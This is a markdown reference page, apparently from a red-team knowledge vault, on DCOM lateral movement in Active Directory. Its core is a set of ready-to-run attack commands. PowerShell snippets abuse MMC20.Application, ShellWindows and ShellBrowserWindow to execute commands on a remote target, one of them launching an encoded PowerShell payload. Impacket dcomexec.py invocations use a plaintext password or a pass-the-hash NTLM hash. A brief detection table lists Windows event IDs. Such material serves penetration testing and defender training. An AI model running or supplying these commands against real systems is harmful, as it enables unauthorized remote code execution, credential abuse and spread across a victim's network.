---
title: "Attack #57 — DCOM Lateral Movement"
description: "DCOM (Distributed Component Object Model) allows code execution on remote systems by instantiating COM objects. The MMC20.Application, ShellWindows, and…"
category: active-directory
subcategory: "Lateral Movement"
tags: ["active-directory", "lateral-movement"]
tools: ["Impacket", "PowerShell"]
difficulty: advanced
updated: "2026-08-10"
source: "vault:ActiveDirectory/AD-Attack/Category-Seven/⚫ Attack #57 — DCOM Lateral Movement.md"
---
# ⚫ Attack #57 — DCOM Lateral Movement

***

## 📖 How It Works

DCOM (Distributed Component Object Model) allows code execution on remote systems by instantiating COM objects. The `MMC20.Application`, `ShellWindows`, and `ShellBrowserWindow` objects can be abused to execute commands remotely without creating services or writing files — making it stealthier than PsExec.

***

## ⚙️ Prerequisites

| Requirement | Detail |
|---|---|
| **Local admin on target** | Required for DCOM activation |
| **DCOM enabled** | Default enabled, port 135 + dynamic RPC |

***

## 💻 Full Commands

```powershell
# ── MMC20.Application ─────────────────────────────────────────────────────────
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","TARGET"))
$com.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c whoami > C:\Temp\out.txt","Minimized")

# ── ShellWindows ──────────────────────────────────────────────────────────────
$com = [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39","TARGET"))
$com.Item().Document.Application.ShellExecute("cmd.exe","/c calc.exe","C:\Windows\System32",$null,0)

# ── ShellBrowserWindow ────────────────────────────────────────────────────────
$com = [activator]::CreateInstance([type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880","TARGET"))
$com.Document.Application.ShellExecute("cmd.exe","/c powershell -e <base64>","C:\Windows",$null,0)
```

```bash
# ── Impacket — dcomexec.py ────────────────────────────────────────────────────
dcomexec.py corp.local/Administrator:'Password1'@10.10.10.10

# ── With PtH ──────────────────────────────────────────────────────────────────
dcomexec.py corp.local/Administrator@10.10.10.10 -hashes :2b576acbe6bcfda7294d6bd18041b8fe
```

***

## 🛡️ Detection — Event IDs

| Event ID | Source | What to Look For |
|---|---|---|
| **4624** | Security Log | Logon Type 3 via DCOM |
| **4688** | Security Log | Process creation from mmc.exe or explorer.exe (DCOM host) |

***

> ✅ **Attack #57 — DCOM Lateral Movement complete.**
